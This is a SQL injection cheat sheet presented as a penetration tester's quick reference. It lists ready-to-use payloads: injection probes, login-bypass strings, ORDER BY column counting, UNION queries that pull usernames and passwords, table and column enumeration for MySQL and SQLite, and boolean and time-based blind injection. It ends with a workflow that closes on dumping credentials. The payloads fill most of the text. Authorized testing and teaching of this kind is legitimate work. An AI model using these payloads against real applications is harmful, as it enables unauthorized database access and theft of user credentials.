# SQL Injection Cheat Sheet – Pentester Quick Reference

A quick reference for common SQL injection techniques used during web application penetration testing.

---

## Initial Injection Tests

Test whether input fields are injectable.

```sql
'
''
`
"
```

Look for:

- SQL errors
- page behavior changes
- response size differences

---

## Authentication Bypass

Classic login bypass payloads:

```sql
' OR 1=1--
' OR '1'='1
admin'--
' OR 1=1#
```

Example vulnerable query:

```sql
SELECT * FROM users
WHERE username='INPUT' AND password='INPUT'
```

Injected request:

```sql
username=' OR 1=1--
```

Result: authentication bypass.

---

## Column Count Discovery

Find the number of columns using ORDER BY.

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

Stop when the server returns an error.

Example error:

```
Unknown column
```

---

## UNION Injection

Test UNION queries.

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Match the number of columns.

Example data extraction:

```sql
' UNION SELECT username,password FROM users--
```

---

## Table Enumeration (MySQL)

```sql
' UNION SELECT table_name,NULL
FROM information_schema.tables--
```

---

## Column Enumeration (MySQL)

```sql
' UNION SELECT column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--
```

---

## SQLite Table Enumeration

SQLite does not use information_schema.

```sql
' UNION SELECT name,NULL
FROM sqlite_master
WHERE type='table'--
```

---

## Data Extraction Example

```sql
' UNION SELECT username,password
FROM users--
```

---

## Blind SQL Injection

When errors are hidden.

Boolean testing:

```sql
' AND 1=1--
' AND 1=2--
```

Different responses indicate possible injection.

---

## Time-Based Injection

MySQL:

```sql
' OR SLEEP(5)--
```

PostgreSQL:

```sql
' OR pg_sleep(5)--
```

SQLite:

```sql
' OR randomblob(100000000)--
```

---

## Pentesting Workflow

```
1. Identify parameter
2. Test for injection
3. Determine column count
4. Use UNION to extract data
5. Enumerate tables
6. Dump credentials
```

---

## Common Testing Parameters

```
login
search
id
product_id
user
page
category
```

---

## Tools Commonly Used

```
Caido
Burp Suite
sqlmap
ffuf
```

---

## Example Payload List

```sql
'
''
' OR 1=1--
' UNION SELECT NULL--
' UNION SELECT username,password FROM users--
```
